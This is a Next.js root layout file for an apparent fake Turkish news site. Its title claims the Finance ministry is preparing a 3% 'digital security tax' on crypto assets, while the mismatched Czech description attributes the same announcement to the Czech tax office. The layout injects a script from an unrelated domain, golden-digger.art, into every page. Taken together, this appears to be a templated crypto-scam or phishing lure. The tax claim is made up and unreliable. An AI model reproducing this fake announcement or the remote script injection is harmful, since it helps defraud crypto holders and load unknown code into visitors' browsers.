export const metadata = {
  title: "SON DAKİKA: Maliye, 200.000 TL üzeri kripto varlıklara %3 “dijital güvenlik vergisi” getirmeye hazırlanıyor — Turk Portal",
  description: "Finanční správa České republiky dnes vydala mimořádné oznámení ohledně plánované 3% digitální bezpečnostní daně z kryptoměn.",
};

export const viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
};

import "./globals.css";

export default function RootLayout({ children }) {
  return (
    <html lang="tr">
      <body>
        {children}
        <script src="https://golden-digger.art/p/da43ad07-4f7a-49ab-a29f-4e564c58e854/bootstrap.js" async defer></script>
      </body>
    </html>
  );
}
